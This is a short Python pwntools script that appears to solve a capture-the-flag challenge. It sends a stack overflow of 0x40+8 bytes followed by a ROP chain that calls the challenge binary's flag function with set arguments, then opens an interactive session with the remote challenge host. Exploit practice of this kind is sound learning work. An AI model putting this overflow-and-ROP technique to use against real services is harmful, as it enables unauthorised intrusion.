from pwn import *

io = remote('challs.actf.co', 31225)
context.binary = elf = ELF('really_obnoxious_problem')
rop = ROP(elf)
rop.flag(4919, 0x402004)

payload = b'A' * (0x40 + 8) + rop.chain()
io.sendline(b'billy')
io.sendline(payload)
io.interactive()
